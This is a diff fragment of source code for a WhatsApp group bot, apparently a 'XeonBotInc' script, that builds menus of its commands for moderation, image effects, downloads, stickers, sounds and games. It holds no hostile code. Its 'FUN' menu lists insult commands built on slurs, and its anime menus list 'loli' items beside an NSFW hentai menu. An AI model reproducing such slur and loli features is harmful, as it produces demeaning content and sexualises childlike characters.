+										"title": "Anime Sticker Menu 🔖",
+										"description": "Displays The List Of Anime Sticker Features",
+										"rowId": `${prefix}animestickermenu`
+									     },
+									{
+										"title": "Nsfw Menu 🔖“",
+										"description": "Displays The List Of Nsfe Features",
+										"rowId": `${prefix}nsfwmenu`
+									     },
+										{
+											"title": "Fun Menu 🔖",
+										"description": "Displays The List Of Fun Features",
+										"rowId": `${prefix}funmenu`
+										},
+										{
+										"title": "Game Menu 🔖",
+										"description": "Displays The List Of Game Features",
+										"rowId": `${prefix}gamemenu`
+									},
+										{
+											"title": "Convert Menu 🔖",
+										"description": "Displays The List Of Convert Features",
+										"rowId": `${prefix}convertmenu`
+										},
+										{
+											"title": "Database Menu 🔖",
+										"description": "Displays The List Of Database Features",
+										"rowId": `${prefix}databasemenu`
+										}
+								]
+							},
+							{
+								"title": "Chat With Fellow Users 🔖",
+								"rows": [
+									{
+										"title": "Anonymous Chat Menu 🔖",
+										"description": "Displays The List Of Anonymous Chat Features",
+										"rowId": `${prefix}anonymousmenu`
+									}
+								]
+							},
+							{
+								"title": "Credit 🔖",
+								"rows": [
+									{
+										"title": "Thanks To 🔖",
+										"description": "Displays The List Of Credit Of The Bot !!",
+										"rowId": `${prefix}tqtt`
+									}
+								]
+							}
+						]
+const listMessage = {
+  text: "Please choose the menu📸",
+  footer: `${botname}\n“🕴🏻YouTube: ${websitex}\n🕴🏻Script: ${botscript}`,
+  title: `Hi👋🏻 ‘‹ ${pushname}`,
+  buttonText: "Menu🙇🏻‍♂️",
+  sections
+}
+const sendMsg = await XeonBotInc.sendMessage(m.chat, listMessage)
+}
+break
+            case 'allmenu':{
+var unicorn = await getBuffer(picak+'All Menu')
+
+const buttons = [
+  {buttonId: 'script', buttonText: {displayText: 'Script 🔖”–'}, type: 1},
+  {buttonId: 'donate', buttonText: {displayText: 'Donate 🔖'}, type: 1},
+  {buttonId: 'owner', buttonText: {displayText: 'Owner 🔖'}, type: 1}
+]
+const buttonMessage = {
+    image: unicorn,
+    caption: `🥷🏻 OWNER 	
+🔖•  ${prefix}self
+🔖•  ${prefix}public
+🔖•  ${prefix}join [link]
+🔖•  ${prefix}leavegc
+🔖•  ${prefix}setbio
+🔖•  ${prefix}broadcast [text]
+🔖•  ${prefix}setppbot [image]
+🔖•  ${prefix}setthumb [reply img]
+🔖•  ${prefix}setexif
+🔖•  ${prefix}hijack
+🔖•  ${prefix}creategroup [name]
+🔖•  ${prefix}block [tag/number]
+🔖•  ${prefix}unblock [tag/number]
+
+       ➡️ GROUP 	        
+🔖• ${prefix}grousetting
+🔖• ${prefix}grouplink
+🔖• ${prefix}ephemeral [option]
+🔖• ${prefix}setgcpp [image]
+🔖• ${prefix}setname [text]
+🔖• ${prefix}setdesc [text]
+🔖• ${prefix}group 
+🔖• ${prefix}resetgrouplink
+🔖• ${prefix}editinfo [option]
+🔖• ${prefix}menfess [number]
+🔖• ${prefix}add [user]
+🔖• ${prefix}kick [reply/tag]
+🔖• ${prefix}hidetag [text]
+🔖• ${prefix}tagall [text]
+🔖• ${prefix}antilinkgc [on/off]
+🔖• ${prefix}antilinktg [on/off]
+🔖• ${prefix}antilinktt [on/off]
+🔖• ${prefix}antilinkytch [on/off]
+🔖• ${prefix}antilinkytvid [on/off]
+🔖• ${prefix}antilinkig [on/off]
+🔖• ${prefix}antilinkfb [on/off]
+🔖• ${prefix}antilinktwit [on/off]
+🔖• ${prefix}antilinkall [on/off]
+🔖• ${prefix}antivirus [on/off]
+🔖• ${prefix}antitoxic [on/off]
+🔖• ${prefix}antiwame [on/off]
+🔖• ${prefix}nsfw [on/off]
+🔖• ${prefix}nsfw [on/off]
+🔖• ${prefix}promote [reply/tag]
+🔖• ${prefix}demote [reply/tag]
+🔖• ${prefix}react [reply emoji]
+🔖• ${prefix}vote
+🔖• ${prefix}devote
+🔖• ${prefix}upvote
+🔖• ${prefix}checkvote
+🔖• ${prefix}delvote
+
+       🎨 MAKER 
+🔖• ${prefix}candy
+🔖• ${prefix}blackpinkneon
+🔖• ${prefix}deepsea
+🔖• ${prefix}scifi
+🔖• ${prefix}fiction
+🔖• ${prefix}berry
+🔖• ${prefix}fruitjuice
+🔖• ${prefix}biscuit
+🔖• ${prefix}wood
+🔖• ${prefix}chocolate
+🔖• ${prefix}matrix
+🔖• ${prefix}blood
+🔖• ${prefix}halloween
+🔖• ${prefix}wicker
+🔖• ${prefix}darkgold
+🔖• ${prefix}firework
+🔖• ${prefix}skeleton
+🔖• ${prefix}sand
+🔖• ${prefix}glue
+🔖• ${prefix}leaves
+🔖• ${prefix}magma
+🔖• ${prefix}lava
+🔖• ${prefix}rock
+🔖• ${prefix}bloodglas
+🔖• ${prefix}underwater
+🔖• ${prefix}textmaker
+??• ${prefix}honey
+🔖• ${prefix}ice
+🔖• ${prefix}watercolor
+🔖• ${prefix}multicolor
+🔖• ${prefix}snow
+🔖• ${prefix}harrypot
+🔖• ${prefix}harrypotter
+🔖• ${prefix}brokenglass
+🔖• ${prefix}waterpipe
+🔖• ${prefix}spooky
+🔖• ${prefix}circuit
+🔖• ${prefix}metallic
+🔖• ${prefix}demon
+🔖• ${prefix}sparklechristmas
+🔖• ${prefix}christmas
+🔖• ${prefix}3dchristmas
+🔖• ${prefix}3dbox
+🔖• ${prefix}waterdrop
+🔖• ${prefix}lion2
+🔖• ${prefix}papercut
+🔖• ${prefix}transformer
+🔖• ${prefix}neondevil
+🔖• ${prefix}3davengers
+🔖• ${prefix}3dstone
+🔖• ${prefix}3dstone2
+🔖• ${prefix}summertime
+🔖• ${prefix}thunder
+🔖• ${prefix}window
+🔖• ${prefix}graffiti
+🔖• ${prefix}graffitibike
+🔖• ${prefix}pornhub
+🔖• ${prefix}glitch
+🔖• ${prefix}blackpink
+🔖• ${prefix}glitch2
+🔖• ${prefix}glitch3
+🔖• ${prefix}3dspace
+🔖• ${prefix}lion
+🔖• ${prefix}3dneon
+🔖• ${prefix}greenneon
+🔖• ${prefix}bokeh
+🔖• ${prefix}holographic
+🔖• ${prefix}bear
+🔖• ${prefix}wolf
+🔖• ${prefix}joker
+🔖• ${prefix}dropwater
+🔖• ${prefix}dropwater2
+🔖• ${prefix}thewall
+🔖• ${prefix}neonlight
+🔖• ${prefix}natural
+🔖• ${prefix}carbon
+🔖• ${prefix}pencil
+🔖• ${prefix}blackpink2
+🔖• ${prefix}neon
+🔖• ${prefix}neonlight2
+🔖• ${prefix}toxic
+🔖• ${prefix}strawberry
+🔖• ${prefix}discovery
+🔖• ${prefix}1917
+🔖•  ${prefix}sci_fi
+🔖•  ${prefix}ancient
+🔖•  ${prefix}fabric
+🔖•  ${prefix}hoorror
+🔖•  ${prefix}whitebear
+🔖•  ${prefix}juice
+🔖•  ${prefix}batman
+🔖•  ${prefix}multicolor
+🔖•  ${prefix}collwall
+🔖•  ${prefix}wonderful
+🔖•  ${prefix}cool
+🔖•  ${prefix}sketch
+🔖•  ${prefix}marvel
+🔖•  ${prefix}foggy
+🔖•  ${prefix}writing
+🔖•  ${prefix}halloweenfire
+🔖•  ${prefix}halloween
+🔖•  ${prefix}watercolor
+🔖•  ${prefix}classic
+
+        ⬇️ DOWNLOAD	
+🔖• ${prefix}tiktok [url]
+🔖• ${prefix}tiktokaudio[url]
+🔖• ${prefix}mediafire [url]
+🔖• ${prefix}ytmp3 [url|quality]
+🔖• ${prefix}ytmp4 [url|quality]
+🔖• ${prefix}gitclone [repo link]
+🔖• ${prefix}soundcloud [url]
+🔖• ${prefix}zippyshare [url]
+
+        🔎 SEARCH 	
+🔖• ${prefix}play [query]
+🔖• ${prefix}song [query]
+🔖• ${prefix}yts [query]
+🔖• ${prefix}lyrics [query]
+🔖• ${prefix}google [query]
+🔖• ${prefix}gimage [query]
+🔖• ${prefix}pinterest [query]
+🔖• ${prefix}image [query]
+🔖• ${prefix}film [query]
+🔖• ${prefix}wallpaper [query]
+🔖• ${prefix}searchgc [query]
+🔖• ${prefix}happymod [query]
+🔖• ${prefix}servermc
+🔖• ${prefix}mcpedl [query]
+🔖• ${prefix}tvsearch [query]
+🔖• ${prefix}wikimedia [query]
+🔖• ${prefix}ytsearch [query]
+🔖• ${prefix}ringtone [query]
+🔖• ${prefix}wattpad [query]
+🔖•  ${prefix}mcserver [ip|port]
+
+        ♾️ CONVERT
+🔖•  ${prefix}toimage [reply stick]
+🔖•  ${prefix}sticker [reply img|gif]
+🔖•  ${prefix}take [reply img|gif|stik]
+🔖•  ${prefix}smeme [reply img]
+🔖•  ${prefix}emoji [emoji]
+🔖•  ${prefix}tovideo [reply img]
+🔖•  ${prefix}togif [reply stick]
+🔖•  ${prefix}tourl [reply img]
+🔖•  ${prefix}tovn [reply aud]
+🔖•  ${prefix}tomp3 [reply vn]
+🔖•  ${prefix}toaudio [reply vid]
+🔖•  ${prefix}ebinary [reply txt]
+🔖•  ${prefix}dbinary [reply txt]
+🔖•  ${prefix}tinyurl [link]
+🔖•  ${prefix}styletext [text]
+🔖• ${prefix}volume [reply aud]
+🔖• ${prefix}bass [reply aud]
+🔖• ${prefix}blown [reply aud]
+🔖• ${prefix}deep [reply aud]
+🔖• ${prefix}earrape [reply aud]
+🔖• ${prefix}fast [reply aud]
+🔖• ${prefix}fat [reply aud]
+🔖• ${prefix}nightcore [reply aud]
+🔖• ${prefix}reverse [reply aud]
+🔖• ${prefix}robot [reply aud]
+🔖• ${prefix}slow [reply aud]
+🔖• ${prefix}squirrel [reply aud]
+
+       🎈IMG EFFECT
+🔖• ${prefix}wanted [reply img]
+🔖• ${prefix}triggeredwebp [reply img]
+🔖• ${prefix}removebg [reply img]
+🔖• ${prefix}upscaler [reply img]
+
+       🎠 RANDOM IMG
+🔖• ${prefix}coffee
+🔖• ${prefix}woof
+🔖• ${prefix}meow
+🔖• ${prefix}lizard
+🔖• ${prefix}wallneon
+🔖• ${prefix}wallpubg
+🔖• ${prefix}wallml
+🔖• ${prefix}wallrandom
+🔖• ${prefix}wallcode
+🔖• ${prefix}animewall [query]
+🔖• ${prefix}animewall2 [query]
+
+       🐣 EMOTE
+🔖• ${prefix}instagramemoji
+👨??‍💻• ${prefix}facebookemoji
+🔖• ${prefix}iphoneemoji
+🔖• ${prefix}samsungemoji
+🔖• ${prefix}joyemoji
+🔖• ${prefix}skypeemoji
+🔖• ${prefix}twitteremoji
+🔖• ${prefix}whatsappemoji
+🔖• ${prefix}microsoftemoji
+🔖• ${prefix}googleemoji
+🔖• ${prefix}pediaemoji
+🔖• ${prefix}microsoftemoji
+
+       👾 ANIME
+🔖• ${prefix}asuna
+🔖• ${prefix}anna
+🔖• ${prefix}chitoge
+🔖• ${prefix}cosplay
+🔖• ${prefix}elaina
+🔖• ${prefix}emilia
+🔖• ${prefix}gremory
+🔖• ${prefix}kaguya
+🔖• ${prefix}kotori
+🔖• ${prefix}kurumi
+🔖• ${prefix}mikasa
+🔖• ${prefix}rize
+🔖• ${prefix}naruto
+🔖• ${prefix}yaoi
+🔖• ${prefix}animeneko
+🔖• ${prefix}waifu
+🔖• ${prefix}animewaifu
+🔖• ${prefix}animeawoo
+🔖• ${prefix}shinobu
+🔖• ${prefix}foxgirl
+🔖• ${prefix}animemegumin
+🔖• ${prefix}loli-waifu
+🔖• ${prefix}8ball
+🔖• ${prefix}animenom
+🔖• ${prefix}goose
+🔖• ${prefix}avatar
+🔖• ${prefix}tickle
+🔖• ${prefix}gecg
+🔖• ${prefix}feed
+🔖• ${prefix}animeslap
+🔖• ${prefix}animepat
+🔖• ${prefix}animeneko
+🔖• ${prefix}animekiss
+🔖• ${prefix}animewlp
+🔖• ${prefix}animecuddle
+🔖• ${prefix}animecry
+🔖• ${prefix}animekill
+🔖• ${prefix}animelick
+🔖• ${prefix}animebite
+🔖• ${prefix}animeyeet
+🔖• ${prefix}animebully
+🔖• ${prefix}animebonk
+🔖• ${prefix}animewink
+🔖• ${prefix}animepoke
+🔖• ${prefix}animesmile
+🔖• ${prefix}animewave
+🔖• ${prefix}animeawoo
+🔖• ${prefix}animeblush
+🔖• ${prefix}animesmug
+🔖• ${prefix}animeglomp
+🔖• ${prefix}animehappy
+🔖• ${prefix}animedance
+🔖• ${prefix}animecringe
+🔖• ${prefix}animehighfive
+🔖• ${prefix}animehandhold
+🔖• ${prefix}animemegumin
+🔖• ${prefix}animesmug
+🔖• ${prefix}couplepp
+
+       🧚🏻‍♂️STICKER
+🔖•  ${prefix}patrick
+🔖•  ${prefix}emoji
+🔖•  ${prefix}emojimix
+🔖•  ${prefix}attp
+🔖•  ${prefix}ttp
+🔖•  ${prefix}doge
+🔖•  ${prefix}lovesticker
+🔖•  ${prefix}animestick
+
+       🧚🏻‍♀️ ANIME STICKER
+🔖• ${prefix}loli
+🔖• ${prefix}bully
+🔖• ${prefix}cuddle
+🔖• ${prefix}cry
+🔖• ${prefix}hug
+🔖• ${prefix}awoo
+🔖• ${prefix}kiss
+🔖• ${prefix}lick
+🔖• ${prefix}pat
+🔖• ${prefix}smug
+🔖• ${prefix}bonk
+🔖• ${prefix}yeet
+🔖• ${prefix}blush
+🔖• ${prefix}smile
+🔖• ${prefix}wave
+🔖• ${prefix}highfive
+🔖• ${prefix}handhold
+🔖• ${prefix}nom
+🔖• ${prefix}glomp
+🔖• ${prefix}bite
+🔖• ${prefix}slap
+🔖• ${prefix}kill
+🔖• ${prefix}happy
+🔖• ${prefix}wink
+🔖• ${prefix}poke
+🔖• ${prefix}dance
+🔖• ${prefix}cringe
+🔖• ${prefix}neko
+🔖• ${prefix}gura
+
+       🕵🏻‍♂️NSFW
+🔖• ${prefix}hentaivideo
+🔖• ${prefix}hneko
+🔖• ${prefix}nwaifu
+🔖• ${prefix}animespank
+🔖• ${prefix}trap
+🔖• ${prefix}gasm
+
+      🎭 FUN
+🔖•  ${prefix}how [text
+🔖•  ${prefix}when [text]
+🔖•  ${prefix}where [text]
+🔖•  ${prefix}is [text]
+🔖•  ${prefix}what [text]
+🔖•  ${prefix}can [text]
+🔖•  ${prefix}rate [text]
+🔖•  ${prefix}beautifulcheck [tag]
+🔖•  ${prefix}awesomecheck [tag]
+🔖•  ${prefix}prettycheck [tag]
+🔖•  ${prefix}lesbiancheck [tag]
+🔖•  ${prefix}gaycheck [tag]
+🔖•  ${prefix}cutecheck [tag]
+🔖•  ${prefix}uglycheck [tag]
+🔖•  ${prefix}hornycheck [tag]
+🔖•  ${prefix}charactercheck [tag]
+🔖•  ${prefix}lovelycheck [tag]
+🔖•  ${prefix}couple
+🔖•  ${prefix}mysoulmate
+🔖•  ${prefix}hot
+🔖•  ${prefix}sexy
+🔖•  ${prefix}kind
+🔖•  ${prefix}idiot
+🔖•  ${prefix}handsome
+🔖•  ${prefix}beautiful
+🔖•  ${prefix}cute
+🔖•  ${prefix}pretty
+🔖•  ${prefix}lesbian
+🔖•  ${prefix}noob
+🔖•  ${prefix}bastard
+🔖•  ${prefix}foolish
+🔖•  ${prefix}nerd
+🔖•  ${prefix}asshole
+🔖•  ${prefix}gay
+🔖•  ${prefix}smart
+🔖•  ${prefix}stubble
+🔖•  ${prefix}dog
+🔖•  ${prefix}horny
+🔖•  ${prefix}cunt
+🔖•  ${prefix}wibu
+🔖•  ${prefix}noobra
+🔖•  ${prefix}nibba
+🔖•  ${prefix}nibbi
+🔖•  ${prefix}comrade
+🔖•  ${prefix}mumu
+🔖•  ${prefix}rascal
+🔖•  ${prefix}scumbag
+🔖•  ${prefix}nuts
+🔖•  ${prefix}fagot
+🔖•  ${prefix}scoundrel
+🔖•  ${prefix}ditch
+🔖•  ${prefix}dope
+🔖•  ${prefix}gucci
+🔖•  ${prefix}lit
+🔖•  ${prefix}dumbass
+🔖•  ${prefix}crackhead
+🔖•  ${prefix}mf
+🔖•  ${prefix}motherfucker
+🔖•  ${prefix}sucker
+🔖•  ${prefix}fuckboy
+🔖•  ${prefix}playboy
+🔖•  ${prefix}fuckgirl
+🔖•  ${prefix}playgirl
+
+        🎧 SOUND
+🔖•  ${prefix}sound1
+🔖•  ${prefix}sound2
+🔖•  ${prefix}sound3
+🔖•  ${prefix}sound4
+🔖•  ${prefix}sound5
+🔖•  ${prefix}sound6
+🔖•  ${prefix}sound7
+🔖•  ${prefix}sound8
+🔖•  ${prefix}sound9
+🔖•  ${prefix}sound10
+🔖•  ${prefix}sound11
+🔖•  ${prefix}sound12
+🔖•  ${prefix}sound13
+🔖•  ${prefix}sound14
+🔖•  ${prefix}sound15
+🔖•  ${prefix}sound16
+🔖•  ${prefix}sound17
+??•  ${prefix}sound18
+🔖•  ${prefix}sound19
+🔖•  ${prefix}sound20
+🔖•  ${prefix}sound21
+🔖•  ${prefix}sound22
+🔖•  ${prefix}sound23
+🔖•  ${prefix}sound24
+🔖•  ${prefix}sound25
+🔖•  ${prefix}sound26
+🔖•  ${prefix}sound27
+🔖•  ${prefix}sound28
+🔖•  ${prefix}sound29
+🔖•  ${prefix}sound30
+🔖•  ${prefix}sound31
+🔖•  ${prefix}sound32
+🔖•  ${prefix}sound33
+🔖•  ${prefix}sound34
+🔖•  ${prefix}sound35
+🔖•  ${prefix}sound36
+🔖•  ${prefix}sound37
+🔖•  ${prefix}sound38
+🔖•  ${prefix}sound39
+🔖•  ${prefix}sound40
+🔖•  ${prefix}sound41
+🔖•  ${prefix}sound42
+🔖•  ${prefix}sound43
+🔖•  ${prefix}sound44
+🔖•  ${prefix}sound45
+🔖•  ${prefix}sound46
+🔖•  ${prefix}sound47
+🔖•  ${prefix}sound48
+🔖•  ${prefix}sound49
+🔖•  ${prefix}sound50
+🔖•  ${prefix}sound51
+🔖•  ${prefix}sound52
+🔖•  ${prefix}sound53
+🔖•  ${prefix}sound54
+🔖•  ${prefix}sound55
+🔖•  ${prefix}sound56
+🔖•  ${prefix}sound57
+🔖•  ${prefix}sound58
+🔖•  ${prefix}sound59
+🔖•  ${prefix}sound60
+🔖•  ${prefix}sound61
+🔖•  ${prefix}sound62
+🔖•  ${prefix}sound63
+🔖•  ${prefix}sound64
+🔖•  ${prefix}sound65
+🔖•  ${prefix}sound66
+🔖•  ${prefix}sound67
+🔖•  ${prefix}sound68
+🔖•  ${prefix}sound69
+🔖•  ${prefix}sound70
+🔖•  ${prefix}sound71
+🔖•  ${prefix}sound72
+🔖•  ${prefix}sound73
+🔖•  ${prefix}sound74
+🔖•  ${prefix}sound75
+🔖•  ${prefix}sound76
+🔖•  ${prefix}sound77
+🔖•  ${prefix}sound78
+🔖•  ${prefix}sound79
+🔖•  ${prefix}sound80
+🔖•  ${prefix}sound81
+🔖•  ${prefix}sound82
+🔖•  ${prefix}sound83
+🔖•  ${prefix}sound84
+🔖•  ${prefix}sound85
+🔖•  ${prefix}sound86
+🔖•  ${prefix}sound87
+🔖•  ${prefix}sound88
+🔖•  ${prefix}sound89
+🔖•  ${prefix}sound90
+🔖•  ${prefix}sound91
+🔖•  ${prefix}sound92
+🔖•  ${prefix}sound93
+🔖•  ${prefix}sound94
+🔖•  ${prefix}sound95
+🔖•  ${prefix}sound96
+🔖•  ${prefix}sound97
+🔖•  ${prefix}sound98
+🔖•  ${prefix}sound99
+🔖•  ${prefix}sound100
+🔖•  ${prefix}sound101
+🔖•  ${prefix}sound102
+🔖•  ${prefix}sound103
+🔖•  ${prefix}sound104
+🔖•  ${prefix}sound105
+🔖•  ${prefix}sound106
+🔖•  ${prefix}sound107
+🔖•  ${prefix}sound108
+🔖•  ${prefix}sound109
+🔖•  ${prefix}sound110
+🔖•  ${prefix}sound111
+🔖•  ${prefix}sound112
+🔖•  ${prefix}sound113
+🔖•  ${prefix}sound114
+🔖•  ${prefix}sound115
+🔖•  ${prefix}sound116
+🔖•  ${prefix}sound117
+🔖•  ${prefix}sound118
+🔖•  ${prefix}sound119
+🔖•  ${prefix}sound120
+🔖•  ${prefix}sound121
+🔖•  ${prefix}sound122
+🔖•  ${prefix}sound123
+🔖•  ${prefix}sound124
+🔖•  ${prefix}sound125
+🔖•  ${prefix}sound126
+🔖•  ${prefix}sound127
+🔖•  ${prefix}sound128
+🔖•  ${prefix}sound129
+🔖•  ${prefix}sound130
+🔖•  ${prefix}sound131
+🔖•  ${prefix}sound132
+🔖•  ${prefix}sound133
+🔖•  ${prefix}sound134
+🔖•  ${prefix}sound135
+🔖•  ${prefix}sound136
+🔖•  ${prefix}sound137
+🔖•  ${prefix}sound138
+🔖•  ${prefix}sound139
+🔖•  ${prefix}sound140
+🔖•  ${prefix}sound141
+🔖•  ${prefix}sound142
+🔖•  ${prefix}sound143
+🔖•  ${prefix}sound144
+🔖•  ${prefix}sound145
+🔖•  ${prefix}sound146
+🔖•  ${prefix}sound147
+🔖•  ${prefix}sound148
+🔖•  ${prefix}sound149
+🔖•  ${prefix}sound150
+🔖•  ${prefix}sound151
+🔖•  ${prefix}sound152
+🔖•  ${prefix}sound153
+🔖•  ${prefix}sound154
+🔖•  ${prefix}sound155
+🔖•  ${prefix}sound156
+🔖•  ${prefix}sound157
+🔖•  ${prefix}sound158
+🔖•  ${prefix}sound159
+🔖•  ${prefix}sound160
+🔖•  ${prefix}sound161
+
+       🦄 GAME
+🔖•  ${prefix}truth
+🔖•  ${prefix}dare
+🔖•  ${prefix}tictactoe
+🔖•  ${prefix}delttt
+🔖•  ${prefix}guess [option]
+🔖•  ${prefix}math [mode]
+🔖•  ${prefix}suitpvp [tag]
+
+       👤ANONYMOUS CHAT
+🔖• ${prefix}anonymous
+🔖• ${prefix}start
+🔖• ${prefix}next
+🔖• ${prefix}leave
+
+        📂 DATABASE
+🔖•  ${prefix}setcmd
+🔖•  ${prefix}listcmd
+🔖•  ${prefix}delcmd
+🔖•  ${prefix}lockcmd
+🔖•  ${prefix}addmsg
+🔖•  ${prefix}listmsg
+🔖•  ${prefix}getmsg
+🔖•  ${prefix}delmsg
+
+         🥷🏻 OTHER 
+🔖•  ${prefix}afk
+🔖•  ${prefix}id
+🔖•  ${prefix}toqr [link]
+🔖•  ${prefix}repeat
+🔖•  ${prefix}readmore [text]
+🔖•  ${prefix}toviewonce
+🔖•  ${prefix}fliptext [text]]
+🔖•  ${prefix}chatinfo
+🔖•  ${prefix}alive
+🔖•  ${prefix}script
+🔖•  ${prefix}speedtest
+🔖•  ${prefix}ping
+🔖•  ${prefix}owner
+🔖•  ${prefix}menu
+🔖•  ${prefix}delete
+🔖•  ${prefix}quoted
+🔖•  ${prefix}listpc
+🔖•  ${prefix}listgc
+🔖•  ${prefix}donate
+🔖•  ${prefix}request
+🔖•  ${prefix}report [bug]
+`,
+    footer: `${botname}`,
+    buttons: buttons,
+    headerType: 4
+}
+const sendMsg = await XeonBotInc.sendMessage(m.chat, buttonMessage)
+}
+break
+      case 'ownermenu':{
+	   var unicorn = await getBuffer(picak+'Owner Menu')
+const buttons = [
+  {buttonId: 'script', buttonText: {displayText: 'Script 🔖”–'}, type: 1},
+  {buttonId: 'donate', buttonText: {displayText: 'Donate 🔖'}, type: 1},
+  {buttonId: 'owner', buttonText: {displayText: 'Owner 🔖'}, type: 1}
+]
+const buttonMessage = {
+    image: unicorn,
+    caption: `🥷🏻 OWNER	
+🔖•  ${prefix}self
+🔖•  ${prefix}public
+🔖•  ${prefix}join [link]
+🔖•  ${prefix}leavegc
+🔖•  ${prefix}setbio
+🔖•  ${prefix}hijack
+🔖•  ${prefix}creategroup [name]
+🔖•  ${prefix}block [user]
+🔖•  ${prefix}unblock [user]
+🔖•  ${prefix}broadcast [text]
+🔖•  ${prefix}setppbot [image]
+🔖•  ${prefix}setthumb [reply img]
+🔖•  ${prefix}setexif
+`,
+    footer: `${botname}`,
+    buttons: buttons,
+    headerType: 4
+}
+const sendMsg = await XeonBotInc.sendMessage(m.chat, buttonMessage)
+}
+break
+            case 'groupmenu':{
+var unicorn = await getBuffer(picak+'Group Menu')
+
+const buttons = [
+  {buttonId: 'script', buttonText: {displayText: 'Script 🔖”–'}, type: 1},
+  {buttonId: 'donate', buttonText: {displayText: 'Donate 🔖'}, type: 1},
+  {buttonId: 'owner', buttonText: {displayText: 'Owner 🔖'}, type: 1}
+]
+const buttonMessage = {
+    image: unicorn,
+    caption: `➡️ GROUP 	
+🔖• ${prefix}grouplink
+🔖• ${prefix}ephemeral [option]
+🔖• ${prefix}setgcpp [image]
+🔖• ${prefix}setname [text]
+🔖• ${prefix}setdesc [text]
+🔖• ${prefix}group
+🔖• ${prefix}botgroups
+🔖• ${prefix}resetgrouplink
+🔖• ${prefix}editinfo [option]
+🔖• ${prefix}add [user]
+🔖• ${prefix}menfess [number]
+🔖• ${prefix}kick [reply/tag]
+🔖• ${prefix}hidetag [text]
+🔖• ${prefix}tagall [text]
+🔖• ${prefix}autosticker [on/off]
+🔖• ${prefix}autostickerpc [on/off]
+🔖• ${prefix}leveling [on/off]
+🔖• ${prefix}antilinkgc [on/off]
+🔖• ${prefix}antilinktg [on/off]
+🔖• ${prefix}antilinktt [on/off]
+🔖• ${prefix}antilinkytch [on/off]
+🔖• ${prefix}antilinkytvid [on/off]
+🔖• ${prefix}antilinkig [on/off]
+🔖• ${prefix}antilinkfb [on/off]
+🔖• ${prefix}antilinktwit [on/off]
+🔖• ${prefix}antilinkall [on/off]
+🔖• ${prefix}antivirus [on/off]
+🔖• ${prefix}antitoxic [on/off]
+🔖• ${prefix}antiwame [on/off]
+🔖• ${prefix}nsfw [on/off]
+🔖• ${prefix}promote [reply/tag]
+🔖• ${prefix}demote [reply/tag]
+🔖• ${prefix}react [reply emoji]
+🔖• ${prefix}getpp [reply user]
+🔖• ${prefix}vote
+🔖• ${prefix}devote
+🔖• ${prefix}upvote
+🔖• ${prefix}checkvote
+🔖• ${prefix}delvote
+`,
+    footer: `${botname}`,
+    buttons: buttons,
+    headerType: 4
+}
+const sendMsg = await XeonBotInc.sendMessage(m.chat, buttonMessage)
+}
+break
+case 'makermenu':{
+var unicorn = await getBuffer(picak+'Maker Menu')
+
+const buttons = [
+  {buttonId: 'script', buttonText: {displayText: 'Script 🔖”–'}, type: 1},
+  {buttonId: 'donate', buttonText: {displayText: 'Donate 🔖'}, type: 1},
+  {buttonId: 'owner', buttonText: {displayText: 'Owner 🔖'}, type: 1}
+]
+const buttonMessage = {
+    image: unicorn,
+    caption: `🎨 MAKER	
+🔖• ${prefix}candy
+🔖• ${prefix}8bit
+🔖• ${prefix}horror
+🔖• ${prefix}hoorror
+🔖• ${prefix}retro
+🔖• ${prefix}blackpinkneon
+🔖• ${prefix}deepsea
+🔖• ${prefix}scifi
+🔖• ${prefix}fiction
+🔖• ${prefix}berry
+🔖• ${prefix}fruitjuice
+🔖• ${prefix}biscuit
+🔖• ${prefix}wood
+🔖• ${prefix}chocolate
+🔖• ${prefix}matrix
+🔖• ${prefix}blood
+🔖• ${prefix}halloween
+🔖• ${prefix}wicker
+🔖• ${prefix}darkgold
+🔖• ${prefix}firework
+🔖• ${prefix}skeleton
+🔖• ${prefix}sand
+🔖• ${prefix}glue
+🔖• ${prefix}leaves
+🔖• ${prefix}magma
+🔖• ${prefix}lava
+🔖• ${prefix}rock
+🔖• ${prefix}bloodglas
+🔖• ${prefix}underwater
+🔖• ${prefix}textmaker
+🔖• ${prefix}honey
+🔖• ${prefix}ice
+🔖• ${prefix}watercolor
+🔖• ${prefix}multicolor
+🔖• ${prefix}snow
+🔖• ${prefix}harrypot
+🔖• ${prefix}harrypotter
+🔖• ${prefix}brokenglass
+🔖• ${prefix}waterpipe
+🔖• ${prefix}spooky
+🔖• ${prefix}circuit
+??• ${prefix}metallic
+🔖• ${prefix}demon
+🔖• ${prefix}sparklechristmas
+🔖• ${prefix}christmas
+🔖• ${prefix}3dchristmas
+🔖• ${prefix}3dbox
+🔖• ${prefix}waterdrop
+🔖• ${prefix}lion2
+🔖• ${prefix}papercut
+🔖• ${prefix}transformer
+🔖• ${prefix}neondevil
+🔖• ${prefix}3davengers
+🔖• ${prefix}3dstone
+🔖• ${prefix}3dstone2
+🔖• ${prefix}summertime
+🔖• ${prefix}thunder
+🔖• ${prefix}window
+🔖• ${prefix}graffiti
+🔖• ${prefix}graffitibike
+🔖• ${prefix}pornhub
+🔖• ${prefix}glitch
+🔖• ${prefix}blackpink
+🔖• ${prefix}glitch2
+🔖• ${prefix}glitch3
+🔖• ${prefix}3dspace
+🔖• ${prefix}lion
+🔖• ${prefix}3dneon
+🔖• ${prefix}greenneon
+🔖• ${prefix}bokeh
+🔖• ${prefix}holographic
+🔖• ${prefix}bear
+🔖• ${prefix}wolf
+🔖• ${prefix}joker
+🔖• ${prefix}dropwater
+🔖• ${prefix}dropwater2
+🔖• ${prefix}thewall
+🔖• ${prefix}neonlight
+🔖• ${prefix}natural
+🔖• ${prefix}carbon
+🔖• ${prefix}pencil
+🔖• ${prefix}blackpink2
+🔖• ${prefix}neon
+🔖• ${prefix}neonlight2
+🔖• ${prefix}toxic
+🔖• ${prefix}strawberry
+🔖• ${prefix}discovery
+🔖• ${prefix}1917
+🔖•  ${prefix}sci_fi
+🔖•  ${prefix}ancient
+🔖•  ${prefix}fabric
+🔖•  ${prefix}hoorror
+🔖•  ${prefix}whitebear
+🔖•  ${prefix}juice
+🔖•  ${prefix}batman
+🔖•  ${prefix}multicolor
+🔖•  ${prefix}collwall
+🔖•  ${prefix}wonderful
+🔖•  ${prefix}cool
+🔖•  ${prefix}sketch
+🔖•  ${prefix}marvel
+🔖•  ${prefix}foggy
+🔖•  ${prefix}writing
+🔖•  ${prefix}halloweenfire
+🔖•  ${prefix}halloween
+🔖•  ${prefix}watercolor
+🔖•  ${prefix}classic
+`,
+    footer: `${botname}`,
+    buttons: buttons,
+    headerType: 4
+}
+const sendMsg = await XeonBotInc.sendMessage(m.chat, buttonMessage)
+}
+break
+            case 'downloadmenu':{
+var unicorn = await getBuffer(picak+'Download Menu')
+
+const buttons = [
